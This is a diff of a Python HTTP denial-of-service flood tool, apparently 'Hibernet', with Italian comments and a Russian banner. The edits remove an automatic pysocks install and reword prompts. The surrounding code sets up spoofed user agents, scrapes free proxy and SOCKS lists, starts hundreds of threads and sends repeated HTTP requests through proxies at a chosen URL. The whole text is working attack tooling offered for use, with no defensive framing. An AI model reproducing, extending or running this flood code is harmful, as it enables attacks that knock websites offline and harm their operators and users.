@@ -1,16 +1,3 @@
-#import module
-import os, sys
-
-try:
-    import socks
-except:
-    if sys.platform.startswith("linux"):
-        os.system("pip3 install pysocks")
-    elif sys.platform.startswith("freebsd"):
-        os.system("pip3 install pysocks")
-    else:
-        os.system("pip install pysocks")
-#@title Hibernet Attack Methods
 import socket
 import socks
 import threading
@@ -19,6 +6,7 @@ import re
 import urllib.request
 import os
 import sys
+import time
 
 os.system("clear")
 print("З А Г Р У З К А....")
@@ -29,7 +17,6 @@ print('''
 
 DDOS HTTP
 	''') # la grafica ci sta
-
 
 
 useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
@@ -512,7 +499,7 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 
 def proxymode():
 	global choice2
-	choice2 = input("Proxy/socks mode? Answer 'y' to enable it: ")
+	choice2 = input("Proxy/socks mode? 'y'-'n'  ")
 	if choice2 == "y":
 		choiceproxysocks()
 	else:
@@ -530,7 +517,7 @@ def choiceproxysocks():
 		choiceproxysocks()
 
 def choicedownproxy():
-	choice4 = input("Download a new list of proxy? Answer 'y' to do it: ")
+	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
 	if choice4 == "y":
 		urlproxy = "http://free-proxy-list.net/"
 		proxyget(urlproxy)
@@ -538,7 +525,7 @@ def choicedownproxy():
 		proxylist()
 
 def choicedownsocks():
-	choice4 = input("Download a new list of socks? Answer 'y' to do it: ")
+	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
 	if choice4 == "y":
 		urlproxy = "https://www.socks-proxy.net/"
 		proxyget(urlproxy)
@@ -581,7 +568,7 @@ def proxylist():
 def numthreads():
 	global threads
 	try:
-		threads = int(input("Threads (800): "))
+		threads = int(input("Insert number of threads (800): "))
 	except ValueError:
 		threads = 800
 		print ("800 threads selected.\n")
@@ -597,7 +584,7 @@ def multiplication():
 	begin()
 
 def begin():
-	choice6 = input("'Enter' Attack: ")
+	choice6 = input("Press 'Enter' to start attack: ")
 	if choice6 == "":
 		loop()
 	elif choice6 == "Enter": #lool
@@ -649,7 +636,6 @@ def loop():
 		for x in range(threads):
 			RequestDefaultHTTP(x+1).start() # starta la classe apposita
 			print ("Thread " + str(x) + " ready!")
-			
 		go.set() # questo fa avviare i threads appena sono tutti pronti
 
 
@@ -718,7 +704,6 @@ class RequestSocksHTTP(threading.Thread): # la classe del multithreading
 				s.connect((str(url2), int(urlport))) # connessione
 				s.send (str.encode(request)) # invio
 				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
-		print delle richieste
 				try: # invia altre richieste nello stesso thread
 					for y in range(multiple): # fattore di moltiplicazione
 						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
